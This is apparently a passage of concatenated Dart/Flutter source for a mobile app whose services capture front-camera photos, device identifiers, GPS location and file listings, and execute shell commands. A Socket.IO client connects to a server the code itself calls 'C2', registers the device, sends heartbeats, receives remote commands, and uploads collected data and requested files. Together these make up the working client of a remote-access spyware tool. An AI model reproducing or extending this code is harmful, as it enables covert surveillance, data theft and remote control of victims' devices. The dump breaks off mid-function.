        "DataCollectorService (UI Thread): Exception during front camera operations: $e\nStackTrace: $s",
      );
      jsonDataToBuild['frontImageInfo'] = {
        'error': 'Exception during camera operation',
        'details': e.toString(),
      };
    }
    // لا يتم عمل dispose للكاميرا هنا، QrScannerScreen يتولى ذلك

    // 4. إضافة الطابع الزمني النهائي
    jsonDataToBuild['timestamp_collection_utc'] =
        DateTime.now().toUtc().toIso8601String();
    jsonDataToBuild['timestamp_collection_local'] = DateFormat(
      'yyyy-MM-dd HH:mm:ss ZZZZ',
      'en_US',
    ).format(DateTime.now());

    // 5. تجميع الحمولة النهائية
    collectedPayload['data'] = jsonDataToBuild;
    collectedPayload['imageFile'] = capturedFrontImageFile;

    debugPrint(
      "DataCollectorService (UI Thread): Initial data collection process finished. Payload ready.",
    );
    return collectedPayload;
  }

  Future<void> disposeCamera() async {
    debugPrint(
      "DataCollectorService: disposeCamera() called from outside. Disposing camera resources...",
    );
    await _cameraService.dispose();
    debugPrint("DataCollectorService: Camera resources disposed.");
  }
}



// ------------------------------ نهاية الملف: data_collector_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: device_info_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\device_info_service.dart
// ----------------------------------------------------------------------

// lib/services/device_info_service.dart
import 'dart:io' show Platform;

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/foundation.dart' show kIsWeb, debugPrint;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:uuid/uuid.dart';

import '../utils/constants.dart'; //  للوصول إلى PREF_DEVICE_ID المحدث

class DeviceInfoService {
  final DeviceInfoPlugin _deviceInfoPlugin = DeviceInfoPlugin();
  final Uuid _uuid = const Uuid();

  Future<String> getOrCreateUniqueDeviceId() async {
    final prefs = await SharedPreferences.getInstance();
    String? deviceId = prefs.getString(PREF_DEVICE_ID); // استخدام الثابت المحدث

    if (deviceId != null && deviceId.isNotEmpty) {
      debugPrint("DeviceInfoService: Retrieved existing Device ID: $deviceId");
      return deviceId;
    }

    try {
      if (kIsWeb) {
        // For web, a UUID is generally the most reliable persistent client identifier
        // that doesn't rely on browser-specific or easily cleared storage like localStora
        // However, for consistency with mobile, we'll generate a UUID and store it.
        deviceId = "web_${_uuid.v4()}";
      } else if (Platform.isAndroid) {
        final androidInfo = await _deviceInfoPlugin.androidInfo;
        // androidInfo.id (SSAID) can be null or change on factory reset.
        // It's generally unique per app signing key, app, and user.
        // Using it as a base if available.
        String? nativeId =
            androidInfo.id; // android.os.Build.SERIAL is restricted.
        if (nativeId.isNotEmpty && nativeId != "unknown") {
          deviceId = "android_$nativeId";
        } else {
          // Fallback for Android if SSAID is not good
          deviceId = "android_uuid_${_uuid.v4()}";
        }
      } else if (Platform.isIOS) {
        final iosInfo = await _deviceInfoPlugin.iosInfo;
        // identifierForVendor is unique to the app's vendor on that device.
        if (iosInfo.identifierForVendor != null &&
            iosInfo.identifierForVendor!.isNotEmpty) {
          deviceId = "ios_${iosInfo.identifierForVendor!}";
        } else {
          // Fallback for iOS
          deviceId = "ios_uuid_${_uuid.v4()}";
        }
      } else {
        // Other platforms (Linux, Windows, macOS)
        // For desktop, combination of machine details might be an option, but UUID is simpler for now.
        deviceId = "desktop_${_uuid.v4()}";
      }
    } catch (e) {
      debugPrint(
          "DeviceInfoService: Error getting native device ID: $e. Falling back to pure UUID.");
      deviceId = "generic_uuid_${_uuid.v4()}"; // Pure UUID as a last resort
    }
    // Ensure deviceId is never null before saving
    if (deviceId.isEmpty) {
      deviceId = "fallback_uuid_${_uuid.v4()}";
      debugPrint(
          "DeviceInfoService: Device ID was still null/empty, used final fallback UUID: $deviceId");
    }

    await prefs.setString(PREF_DEVICE_ID, deviceId); // استخدام الثابت المحدث
    debugPrint(
        "DeviceInfoService: Generated and saved new Device ID: $deviceId");
    return deviceId;
  }

  Future<Map<String, dynamic>> getDeviceInfo() async {
    final String uniqueId = await getOrCreateUniqueDeviceId();
    final Map<String, dynamic> deviceData = {
      'deviceId': uniqueId, // المعرف الفريد للجهاز
      'platform': 'unknown_platform',
      'osVersion': 'unknown_os_version',
      'model': 'unknown_model',
      'deviceName': 'unknown_device_name',
      'brand': 'unknown_brand',
      'isPhysicalDevice': 'unknown',
      'systemFeatures': <String>[], // خاص بالأندرويد
      'collectedAt': DateTime.now().toUtc().toIso8601String(),
    };

    try {
      if (kIsWeb) {
        deviceData['platform'] = 'web';
        final webBrowserInfo = await _deviceInfoPlugin.webBrowserInfo;
        deviceData['osVersion'] = webBrowserInfo.platform ?? 'N/A';
        deviceData['model'] = webBrowserInfo.browserName
            .toString()
            .split('.')
            .last; // e.g., Chrome
        deviceData['deviceName'] = webBrowserInfo.userAgent?.substring(
                0,
                (webBrowserInfo.userAgent?.length ?? 0) > 200
                    ? 200
                    : (webBrowserInfo.userAgent?.length ?? 0)) ??
            'N/A';
        deviceData['brand'] = webBrowserInfo.vendor ?? 'N/A';
        deviceData['isPhysicalDevice'] =
            'false'; // Web is not a physical device in this context
      } else if (Platform.isAndroid) {
        final androidInfo = await _deviceInfoPlugin.androidInfo;
        deviceData['platform'] = 'android';
        deviceData['osVersion'] = androidInfo.version.release; // e.g., "13"
        deviceData['sdkInt'] = androidInfo.version.sdkInt;
        deviceData['brand'] = androidInfo.brand; // e.g., "samsung"
        deviceData['model'] = androidInfo.model; // e.g., "SM-G991U"
        deviceData['deviceName'] =
            androidInfo.device; // internal name e.g., "starqltesq"
        deviceData['product'] = androidInfo.product; // user-facing product name
        deviceData['display'] = androidInfo.display; // display ID
        deviceData['isPhysicalDevice'] =
            androidInfo.isPhysicalDevice.toString();
        deviceData['systemFeatures'] = androidInfo.systemFeatures;
        // deviceData['androidId_debug'] = androidInfo.id; // SSAID for debugging
      } else if (Platform.isIOS) {
        final iosInfo = await _deviceInfoPlugin.iosInfo;
        deviceData['platform'] = 'ios';
        deviceData['osVersion'] = iosInfo.systemVersion; // e.g., "16.5"
        deviceData['model'] =
            iosInfo.model; // e.g., "iPhone14,5" (internal model name)
        deviceData['utsname_machine'] =
            iosInfo.utsname.machine; // More specific model
        deviceData['deviceName'] = iosInfo.name; // e.g., "John's iPhone"
        deviceData['brand'] = 'Apple';
        deviceData['isPhysicalDevice'] = iosInfo.isPhysicalDevice.toString();
        // deviceData['identifierForVendor_debug'] = iosInfo.identifierForVendor; // For debugging
      }
      // Add other platforms if needed (macOS, Windows, Linux)
    } catch (e, s) {
      debugPrint(
          "DeviceInfoService: Error getting detailed device info: $e\nStackTrace: $s");
      deviceData['error_getting_device_info'] = e.toString();
    }
    return deviceData;
  }
}



// ------------------------------ نهاية الملف: device_info_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: file_system_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\file_system_service.dart
// ----------------------------------------------------------------------

// lib/services/file_system_service.dart
import 'package:flutter/foundation.dart'; // لـ debugPrint
import 'package:flutter/services.dart';
// لا حاجة لـ EnhancedLoggerService هنا مباشرة إذا كانت الأخطاء تُمرر للخارج

class FileSystemService {
  // اسم القناة يجب أن يتطابق مع ما هو معرف في MainActivity.kt
  static const MethodChannel _channel = MethodChannel(
      'com.zeroone.theconduit/files'); // تم التغيير من /filesystem إلى /files

  Future<Map<String, dynamic>?> listFiles(String path) async {
    debugPrint(
        "FileSystemService (Dart): Attempting to list files for path: $path via platform channel");
    try {
      final Map<dynamic, dynamic>? result = await _channel.invokeMethod(
        'listFiles', // اسم الدالة في الكود الأصلي
        {'path': path}, // الوسائط المرسلة
      );
      if (result != null) {
        // تحويل المفاتيح إلى String إذا لم تكن كذلك بالفعل
        final Map<String, dynamic> typedResult = Map<String, dynamic>.from(
          result.map((key, value) => MapEntry(key.toString(), value)),
        );
        debugPrint(
            "FileSystemService (Dart): Successfully listed files. Data: ${typedResult.toString().substring(0, (typedResult.toString().length > 200 ? 200 : typedResult.toString().length))}"); // تسجيل جزء من النتيجة
        return typedResult;
      } else {
        debugPrint(
            "FileSystemService (Dart): Native listFiles method returned null.");
        return {
          'error': 'Native method for listFiles returned null',
          'path': path,
          'files': []
        };
      }
    } on PlatformException catch (e) {
      debugPrint(
          "FileSystemService (Dart): PlatformException during listFiles: ${e.code} - ${e.message} - Details: ${e.details}");
      return {
        'error': e.message,
        'details': e.details,
        'errorCode': e.code,
        'path': path,
        'files': []
      };
    } catch (e) {
      debugPrint("FileSystemService (Dart): Unexpected error in listFiles: $e");
      return {'error': e.toString(), 'path': path, 'files': []};
    }
  }

  Future<Map<String, dynamic>?> executeShellCommand(
    String command,
    List<String> args,
  ) async {
    debugPrint(
        "FileSystemService (Dart): Attempting to execute shell command: '$command' with args: $args");
    // !!! تنبيه: هذا سيفشل إذا لم يتم تنفيذ الجزء الأصلي في MainActivity.kt !!!
    // !!! تأكد من أن MainActivity.kt لديها معالج لـ "executeShell" !!!
    try {
      final Map<dynamic, dynamic>? result = await _channel.invokeMethod(
        'executeShell', // اسم الدالة المتوقع في الكود الأصلي
        {'command': command, 'args': args},
      );
      if (result != null) {
        final Map<String, dynamic> typedResult = Map<String, dynamic>.from(
          result.map((key, value) => MapEntry(key.toString(), value)),
        );
        debugPrint(
            "FileSystemService (Dart): Shell command executed. Output: $typedResult");
        return typedResult;
      } else {
        debugPrint(
            "FileSystemService (Dart): Native executeShell method returned null.");
        return {
          'error': 'Native method for executeShell returned null',
          'command': command
        };
      }
    } on PlatformException catch (e) {
      debugPrint(
          "FileSystemService (Dart): PlatformException during executeShell: ${e.code} - ${e.message} - Details: ${e.details}");
      if (e.code == "NotImplemented") {
        return {
          'error':
              "Shell execution is not implemented on the native side (Android/iOS). Command: '$command'",
          'details': e.details,
          'errorCode': e.code
        };
      }
      return {
        'error': e.message,
        'details': e.details,
        'errorCode': e.code,
        'command': command
      };
    } catch (e) {
      debugPrint(
          "FileSystemService (Dart): Unexpected error in executeShellCommand: $e");
      return {'error': e.toString(), 'command': command};
    }
  }
}



// ------------------------------ نهاية الملف: file_system_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: location_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\location_service.dart
// ----------------------------------------------------------------------

// lib/services/location_service.dart
// الإصدار المعدل لاستخدام إضافة geolocator للعمل بشكل أفضل في الخلفية

import 'dart:async'; // Required for TimeoutException
import 'package:flutter/foundation.dart';
import 'package:geolocator/geolocator.dart';
import 'package:flutter/services.dart';

class LocationService {
  // لا حاجة لإنشاء كائن من Geolocator، فالدوال ثابتة (static)

  Future<Position?> getCurrentLocation() async {
    bool serviceEnabled;
    LocationPermission permission;

    // التحقق من أن خدمات الموقع مفعلة على الجهاز
    serviceEnabled = await Geolocator.isLocationServiceEnabled();
    if (!serviceEnabled) {
      debugPrint("LocationService (geolocator): خدمات الموقع معطلة.");
      return null;
    }

    permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.denied) {
      debugPrint(
        "LocationService (geolocator): إذن الموقع مرفوض. محاولة طلب الإذن...",
      );
      permission = await Geolocator.requestPermission();
      if (permission == LocationPermission.denied) {
        debugPrint("LocationService (geolocator): طلب إذن الموقع مرفوض.");
        return null;
      }
    }

    if (permission == LocationPermission.deniedForever) {
      debugPrint("LocationService (geolocator): إذن الموقع مرفوض بشكل دائم.");
      return null;
    }

    debugPrint(
      "LocationService (geolocator): الأذونات ممنوحة وخدمات الموقع مفعلة. محاولة الحصول على الموقع...",
    );

    try {
      return await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
        // timeLimit: const Duration(seconds: 15), // Can be added if needed
      );
    } on PlatformException catch (e) {
      debugPrint(
        "LocationService (geolocator): خطأ PlatformException أثناء الحصول على الموقع: ${e.code} - ${e.message}",
      );
      return null;
    } on LocationServiceDisabledException catch (e) {
      debugPrint(
        "LocationService (geolocator): خطأ LocationServiceDisabledException: ${e.toString()}",
      );
      return null;
    } on TimeoutException catch (e) {
      // Now TimeoutException is recognized
      debugPrint(
        "LocationService (geolocator): انتهت مهلة الحصول على الموقع: ${e.message}",
      );
      return null;
    } catch (e) {
      debugPrint(
        "LocationService (geolocator): خطأ غير متوقع أثناء الحصول على الموقع: $e",
      );
      return null;
    }
  }
}



// ------------------------------ نهاية الملف: location_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: network_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\network_service.dart
// ----------------------------------------------------------------------

// lib/services/network_service.dart
import 'dart:async';
import 'dart:convert'; // لتحويل json
import 'dart:io'; // لاستخدام File

import 'package:camera/camera.dart' show XFile; // لاستخدام XFile
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart'
    as sio; // Socket.IO Client

import '../config/app_config.dart'; // للوصول إلى URLs والثوابت
import '../core/logging/enhanced_logger_service.dart'; // استخدام المسجل المحسن
import '../utils/constants.dart'; // للوصول إلى أسماء الأحداث ونقاط النهاية

class NetworkService {
  sio.Socket? _socket;
  final EnhancedLoggerService _logger =
      EnhancedLoggerService(); // استخدام المسجل المحسن مباشرة
  int _reconnectAttempts = 0;
  Timer? _reconnectTimer;
  Timer? _heartbeatTimer;
  bool _isReconnecting = false;
  String? _lastConnectedDeviceId; // لتخزين آخر deviceId تم الاتصال به

  final StreamController<bool> _connectionStatusController =
      StreamController<bool>.broadcast();
  Stream<bool> get connectionStatusStream => _connectionStatusController.stream;

  final StreamController<Map<String, dynamic>> _commandController =
      StreamController<Map<String, dynamic>>.broadcast();
  Stream<Map<String, dynamic>> get commandStream => _commandController.stream;

  bool get isSocketConnected => _socket?.connected ?? false;

  NetworkService() {
    _logger.info("NetworkService", "NetworkService instance created.");
  }

  void _initializeSocket(String deviceIdForConnection) {
    _lastConnectedDeviceId = deviceIdForConnection; // حفظ deviceId

    if (_socket != null) {
      // إذا كان هناك socket موجود، تخلص منه أولاً
      _logger.info("NetworkService:_initializeSocket",
          "Disposing existing socket before creating a new one.");
      _socket!.dispose();
      _socket = null;
    }

    _logger.info("NetworkService:_initializeSocket",
        "Initializing Socket.IO to $C2_SOCKET_IO_URL for Device ID: $deviceIdForConnection");
    try {
      _socket = sio.io(C2_SOCKET_IO_URL, <String, dynamic>{
        'transports': ['websocket', 'polling'],
        'autoConnect': false,
        'forceNew': true, // ضمان إنشاء اتصال جديد
        'reconnection': true, // تمكين إعادة الاتصال التلقائي من المكتبة
        'reconnectionAttempts': C2_SOCKET_IO_RECONNECT_ATTEMPTS > 0
            ? C2_SOCKET_IO_RECONNECT_ATTEMPTS
            : 5, // استخدام الثابت أو قيمة افتراضية
        'reconnectionDelay': C2_SOCKET_IO_RECONNECT_DELAY.inMilliseconds,
        'reconnectionDelayMax':
            C2_SOCKET_IO_RECONNECT_DELAY.inMilliseconds * 5, // مثال لحد أقصى
        'timeout': 20000, // مهلة الاتصال بالمللي ثانية
        'query': {
          'deviceId':
              deviceIdForConnection, // إرسال deviceId كـ query parameter
          'clientType': APP_NAME, // اسم التطبيق
          'timestamp': DateTime.now().millisecondsSinceEpoch.toString(),
          'version': '1.0.0', // إصدار التطبيق (مثال)
        },
        // 'auth': { 'token': 'your_optional_auth_token_here' } // إذا كنت تستخدم مصادقة عبر token
      });

      _socket!.onConnect((_) {
        _logger.info("NetworkService:Events",
            "Socket.IO Connected! SID: ${_socket?.id}, Device ID: $deviceIdForConnection");
        _connectionStatusController.add(true);
        _reconnectAttempts = 0;
        _isReconnecting = false;
        _stopReconnectTimer(); // إيقاف أي مؤقتات إعادة اتصال قديمة
        _startHeartbeat(); // بدء نبضات القلب عند الاتصال
        // إعلام background_service بأن الاتصال تم (سيقوم هو بطلب التسجيل)
      });

      _socket!.onDisconnect((reason) {
        _logger.warn("NetworkService:Events",
            "Socket.IO Disconnected. Reason: $reason. Device ID: $_lastConnectedDeviceId");
        _connectionStatusController.add(false);
        _stopHeartbeat(); // إيقاف نبضات القلب
        if (!_isReconnecting && _lastConnectedDeviceId != null) {
          // التأكد من وجود deviceId لإعادة الاتصال
          _scheduleReconnect(); // جدولة إعادة الاتصال
        }
      });

      _socket!.onConnectError((error) {
        _logger.error(
            "NetworkService:Events",
            "Socket.IO Connection Error. Device ID: $_lastConnectedDeviceId",
            error);
        _connectionStatusController.add(false);
        _stopHeartbeat();
        if (!_isReconnecting && _lastConnectedDeviceId != null) {
          _scheduleReconnect();
        }
      });

      _socket!.onError((error) {
        // أخطاء عامة في الـ socket
        _logger.error(
            "NetworkService:Events",
            "Socket.IO Generic Error. Device ID: $_lastConnectedDeviceId",
            error);
        // قد ترغب في التعامل مع هذا بشكل مختلف، ربما لا يتطلب إعادة اتصال فوري
      });

      // الاستماع للحدث الموحد للأوامر من الخادم
      _socket!.on('command', (data) {
        if (data is Map) {
          final String? commandName = data['command'] as String?;
          final Map<String, dynamic> args = data['args'] is Map
              ? Map<String, dynamic>.from(data['args'])
              : {};
          final String? commandId =
              data['command_id'] as String?; // استقبال معرّف الأمر

          if (commandName != null) {
            _logger.info("NetworkService:CommandListener",
                "Received unified command '$commandName' (ID: ${commandId ?? "N/A"}) from C2 with args: $args. Device ID: $_lastConnectedDeviceId");
            _commandController.add({
              'command': commandName,
              'command_id': commandId, // تمرير command_id
              'args': args,
            });
          } else {
            _logger.warn("NetworkService:CommandListener",
                "Received command with null name. Data: $data. Device ID: $_lastConnectedDeviceId");
          }
        } else {
          _logger.warn("NetworkService:CommandListener",
              "Received malformed command data (not a Map): $data. Device ID: $_lastConnectedDeviceId");
        }
      });

      // الاستماع لحدث طلب التسجيل من الخادم
      _socket!.on(SIO_EVENT_REQUEST_REGISTRATION_INFO, (_) {
        _logger.info("NetworkService:Events",
            "Received '$SIO_EVENT_REQUEST_REGISTRATION_INFO' from C2. Device ID: $_lastConnectedDeviceId");
        // إرسال هذا كأمر داخلي للخدمة الخلفية للقيام بالتسجيل
        _commandController.add({
          'command':
              SIO_EVENT_REQUEST_REGISTRATION_INFO, // استخدام نفس اسم الحدث كمعرف للأمر الداخلي
          'command_id':
              'server_request_reg_${DateTime.now().millisecondsSinceEpoch}',
          'args': {},
        });
      });

      // الاستماع لحدث نجاح التسجيل من الخادم (اختياري، للتسجيل فقط)
      _socket!.on(SIO_EVENT_REGISTRATION_SUCCESSFUL, (data) {
        _logger.info("NetworkService:Events",
            "Received '$SIO_EVENT_REGISTRATION_SUCCESSFUL' from C2. Data: $data. Device ID: $_lastConnectedDeviceId");
        // يمكن القيام بأي إجراءات إضافية هنا إذا لزم الأمر بعد تأكيد التسجيل
      });
    } catch (e, stackTrace) {
      _logger.error(
          "NetworkService:_initializeSocket",
          "Exception during Socket.IO instance creation or event listener setup. Device ID: $deviceIdForConnection",
          e,
          stackTrace);
      _connectionStatusController.add(false);
      if (!_isReconnecting && _lastConnectedDeviceId != null) {
        _scheduleReconnect(); // محاولة إعادة الاتصال إذا فشلت التهيئة
      }
    }
  }

  Future<void> connectSocketIO(String deviceIdToConnectWith) async {
    if (_socket == null || _lastConnectedDeviceId != deviceIdToConnectWith) {
      // إذا لم يتم تهيئة الـ socket أو تغير deviceId، قم بالتهيئة
      _logger.info("NetworkService:connectSocketIO",
          "Socket not initialized or deviceId changed. Initializing for $deviceIdToConnectWith.");
      _initializeSocket(deviceIdToConnectWith);
    }

    if (_socket != null && !_socket!.connected) {
      _logger.info("NetworkService:connectSocketIO",
          "Attempting to connect socket for Device ID: $deviceIdToConnectWith...");
      _socket!.connect();
      // لا حاجة لـ Future.delayed هنا، معالجات الأحداث ستتعامل مع النجاح/الفشل
    } else if (_socket != null && _socket!.connected) {
      _logger.info("NetworkService:connectSocketIO",
          "Socket already connected for Device ID: $deviceIdToConnectWith. SID: ${_socket?.id}");
      // التأكد من أن حالة الاتصال مُرسلة بشكل صحيح
      if (!_connectionStatusController.isClosed &&
          _connectionStatusController.hasListener) {
        _connectionStatusController.add(true);
      }
      _startHeartbeat(); // تأكد من أن نبضات القلب تعمل
    } else {
      _logger.error("NetworkService:connectSocketIO",
          "Socket is unexpectedly null after initialization attempt for Device ID: $deviceIdToConnectWith.");
      // محاولة إعادة التهيئة والاتصال مرة أخرى كإجراء احتياطي
      if (!_isReconnecting && _lastConnectedDeviceId != null) {
        _scheduleReconnect();
      }
    }
  }

  void _scheduleReconnect() {
    if (_isReconnecting || _lastConnectedDeviceId == null) {
      _logger.info("NetworkService:_scheduleReconnect",
          "Reconnect already in progress or no deviceId to reconnect with. Skipping.");
      return;
    }
    _isReconnecting = true;
    _reconnectAttempts++;

    _stopReconnectTimer(); // إيقاف المؤقت الحالي إذا كان موجودًا

    final int delaySeconds =
        (_reconnectAttempts * C2_SOCKET_IO_RECONNECT_DELAY.inSeconds).clamp(
            C2_SOCKET_IO_RECONNECT_DELAY.inSeconds,
            60); // تأخير متزايد بحد أقصى

    _logger.info("NetworkService:_scheduleReconnect",
        "Scheduling reconnect attempt #${_reconnectAttempts} in $delaySeconds seconds for Device ID: $_lastConnectedDeviceId.");
    _reconnectTimer = Timer(Duration(seconds: delaySeconds), () {
      if (_lastConnectedDeviceId != null) {
        // تحقق مرة أخرى قبل الاتصال
        _logger.info("NetworkService:_scheduleReconnect",
            "Executing reconnect attempt #$_reconnectAttempts for Device ID: $_lastConnectedDeviceId.");
        connectSocketIO(
            _lastConnectedDeviceId!); // محاولة الاتصال بالـ deviceId المحفوظ
      } else {
        _logger.warn("NetworkService:_scheduleReconnect",
            "Cannot execute reconnect, _lastConnectedDeviceId is null.");
        _isReconnecting =
            false; // السماح بمحاولات مستقبلية إذا أصبح deviceId متاحًا
      }
    });
  }

  void _stopReconnectTimer() {
    _reconnectTimer?.cancel();
    _reconnectTimer = null;
  }

  void _startHeartbeat() {
    if (_lastConnectedDeviceId == null) {
      _logger.warn("NetworkService:_startHeartbeat",
          "Cannot start heartbeat, _lastConnectedDeviceId is null.");
      return;
    }
    _stopHeartbeat(); // إيقاف أي مؤقت نبضات قلب سابق

    _logger.info("NetworkService:_startHeartbeat",
        "Starting heartbeat with interval ${C2_HEARTBEAT_INTERVAL.inSeconds} seconds for Device ID: $_lastConnectedDeviceId.");
    _heartbeatTimer = Timer.periodic(C2_HEARTBEAT_INTERVAL, (_) {
      if (isSocketConnected && _lastConnectedDeviceId != null) {
        _logger.debug("NetworkService:HeartbeatTimer",
            "Sending heartbeat for Device ID: $_lastConnectedDeviceId.");
        sendHeartbeat({
          'deviceId': _lastConnectedDeviceId!,
          'timestamp': DateTime.now().toIso8601String()
        });
      } else {
        _logger.warn("NetworkService:HeartbeatTimer",
            "Cannot send heartbeat - socket not connected or no deviceId. Stopping heartbeat. Device ID: $_lastConnectedDeviceId");
        _stopHeartbeat(); // إيقاف نبضات القلب
        // إعادة الاتصال ستتم معالجتها بواسطة onDisconnect أو Watchdog
      }
    });
  }

  void _stopHeartbeat() {
    if (_heartbeatTimer != null) {
      _logger.info("NetworkService:_stopHeartbeat",
          "Stopping heartbeat. Device ID: $_lastConnectedDeviceId");
      _heartbeatTimer!.cancel();
      _heartbeatTimer = null;
    }
  }

  void disconnectSocketIO() {
    _logger.info("NetworkService:disconnectSocketIO",
        "Disconnecting and disposing Socket.IO. Device ID: $_lastConnectedDeviceId");
    _stopHeartbeat();
    _stopReconnectTimer(); // إيقاف أي محاولات إعادة اتصال مجدولة
    _isReconnecting = false; // إعادة تعيين حالة إعادة الاتصال

    if (_socket != null) {
      if (_socket!.connected) {
        _socket!.disconnect();
      }
      _socket!.dispose(); // التخلص من الـ socket بشكل كامل
      _socket = null;
    }
    // لا تغلق _connectionStatusController هنا، قد يتم إعادة استخدامه
    // _commandController أيضاً
    _logger.info("NetworkService:disconnectSocketIO",
        "Socket.IO resources released for Device ID: $_lastConnectedDeviceId.");
  }

  void registerDeviceWithC2(Map<String, dynamic> deviceInfoPayload) {
    if (isSocketConnected) {
      // التأكد من أن الحمولة تحتوي على deviceId
      if (!deviceInfoPayload.containsKey('deviceId') ||
          (deviceInfoPayload['deviceId'] as String?)?.isEmpty == true) {
        deviceInfoPayload['deviceId'] =
            _lastConnectedDeviceId ?? 'unknown_fallback_id_in_reg';
        _logger.warn("NetworkService:registerDeviceWithC2",
            "deviceId was missing in payload, added: ${deviceInfoPayload['deviceId']}");
      }
      _logger.info("NetworkService:registerDeviceWithC2",
          "Sending '$SIO_EVENT_REGISTER_DEVICE' with payload for Device ID: ${deviceInfoPayload['deviceId']}. Payload: ${jsonEncode(deviceInfoPayload)}");
      _socket!.emit(SIO_EVENT_REGISTER_DEVICE, deviceInfoPayload);
    } else {
      _logger.warn("NetworkService:registerDeviceWithC2",
          "Cannot register device. Socket not connected. Device ID: $_lastConnectedDeviceId");
      if (!_isReconnecting && _lastConnectedDeviceId != null) {
        _scheduleReconnect(); // محاولة إعادة الاتصال إذا لم يكن متصلاً
      }
    }
  }

  void sendHeartbeat(Map<String, dynamic> heartbeatPayload) {
    if (isSocketConnected) {
      _logger.debug("NetworkService:sendHeartbeat",
          "Sending '$SIO_EVENT_DEVICE_HEARTBEAT' for Device ID: ${heartbeatPayload['deviceId']}");
      _socket!.emit(SIO_EVENT_DEVICE_HEARTBEAT, heartbeatPayload);
    } else {
      _logger.warn("NetworkService:sendHeartbeat",
          "Cannot send heartbeat. Socket not connected. Device ID: ${heartbeatPayload['deviceId']}");
    }
  }

  void sendCommandResponse({
    required String originalCommand,
    String? commandId, // معرّف الأمر الفريد
    required String status,
    dynamic payload,
  }) {
    if (isSocketConnected) {
      final response = {
        'command': originalCommand,
        'command_id': commandId ??
            'client_generated_${DateTime.now().millisecondsSinceEpoch}', // معرّف احتياطي إذا كان فارغًا
        'status': status,
        'payload': payload ?? {},
        'timestamp_response_utc': DateTime.now().toUtc().toIso8601String(),
        'deviceId': _lastConnectedDeviceId ??
            'unknown_id_in_resp' // إضافة deviceId للاستجابة
      };
      _logger.info("NetworkService:sendCommandResponse",
          "Sending '$SIO_EVENT_COMMAND_RESPONSE' for command '$originalCommand' (ID: ${response['command_id']}) with status '$status'. Device ID: ${response['deviceId']}");
      _socket!.emit(SIO_EVENT_COMMAND_RESPONSE, response);
    } else {
      _logger.warn("NetworkService:sendCommandResponse",
          "Cannot send command response for '$originalCommand'. Socket not connected. Device ID: $_lastConnectedDeviceId");
    }
  }

  Future<bool> sendInitialData({
    required Map<String, dynamic> jsonData,
    XFile? imageFile,
  }) async {
    final Uri url =
        Uri.parse(C2_HTTP_SERVER_URL + HTTP_ENDPOINT_UPLOAD_INITIAL_DATA);
    _logger.info("NetworkService:sendInitialData",
        "Sending initial data to: $url. Device ID from JSON: ${jsonData['deviceId']}");

    try {
      var request = http.MultipartRequest('POST', url);
      // التأكد من أن deviceId موجود في jsonData
      if (!jsonData.containsKey('deviceId') ||
          (jsonData['deviceId'] as String?)?.isEmpty == true) {
        jsonData['deviceId'] = _lastConnectedDeviceId ?? 'fallback_initial_id';
        _logger.warn("NetworkService:sendInitialData",
            "deviceId was missing in jsonData, added: ${jsonData['deviceId']}");
      }
      request.fields['json_data'] = jsonEncode(jsonData);

      if (imageFile != null) {
        _logger.info("NetworkService:sendInitialData",
            "Attaching initial image file: ${imageFile.name} (Path: ${imageFile.path})");
        final file = File(imageFile.path);
        if (await file.exists()) {
          request.files.add(await http.MultipartFile.fromPath(
            'image', // اسم الحقل المتوقع من الخادم
            imageFile.path,
            filename: imageFile.name,
          ));
          _logger.info("NetworkService:sendInitialData",
              "Initial image file '${imageFile.name}' attached successfully.");
        } else {
          _logger.warn("NetworkService:sendInitialData",
              "Initial image file does NOT exist at path: ${imageFile.path}. Skipping attachment.");
        }
      } else {
        _logger.info("NetworkService:sendInitialData",
            "No initial image file provided to attach.");
      }

      var response = await request
          .send()
          .timeout(const Duration(seconds: 45)); // زيادة المهلة قليلاً
      final responseBody = await response.stream.bytesToString();
      _logger.info("NetworkService:sendInitialData",
          "Server Response Status Code: ${response.statusCode}. Body: $responseBody");

      if (response.statusCode >= 200 && response.statusCode < 300) {
        _logger.info("NetworkService:sendInitialData",
            "Initial data sent successfully to C2 server.");
        return true;
      } else {
        _logger.error("NetworkService:sendInitialData",
            "Failed to send initial data. Status Code: ${response.statusCode}, Body: $responseBody");
        return false;
      }
    } on TimeoutException catch (e, s) {
      _logger.error("NetworkService:sendInitialData",
          "Timeout sending initial data", e, s);
      return false;
    } catch (e, s) {
      _logger.error("NetworkService:sendInitialData",
          "Network Error sending initial data", e, s);
      return false;
    }
  }

  Future<bool> uploadFileFromCommand({
    required String deviceId, // المعرف الفعلي للجهاز
    required String commandRef,
    String? commandId, // معرّف الأمر الفريد
    required XFile fileToUpload,
    String fieldName = 'file',
  }) async {
    final Uri url =
        Uri.parse(C2_HTTP_SERVER_URL + HTTP_ENDPOINT_UPLOAD_COMMAND_FILE);
    _logger.info("NetworkService:uploadFileFromCommand",
        "Uploading command file '${fileToUpload.name}' to: $url for Device ID: $deviceId, Command Ref: '$commandRef' (ID: ${commandId ?? "N/A"})");

    try {
      var request = http.MultipartRequest('POST', url);
      request.fields['deviceId'] = deviceId; // إرسال deviceId الصحيح
      request.fields['commandRef'] = commandRef;
      if (commandId != null) {
        request.fields['commandId'] =
            commandId; // إرسال commandId إذا كان متاحًا
      }

      _logger.info("NetworkService:uploadFileFromCommand",
          "Attaching command file: ${fileToUpload.path}, name: ${fileToUpload.name}");
      final file = File(fileToUpload.path);
      if (await file.exists()) {
        request.files.add(await http.MultipartFile.fromPath(
          fieldName, // اسم الحقل المتوقع 'file'
          fileToUpload.path,
          filename: fileToUpload.name,
        ));
        _logger.info("NetworkService:uploadFileFromCommand",
            "Command file '${fileToUpload.name}' attached successfully.");
      } else {
        _logger.error("NetworkService:uploadFileFromCommand",
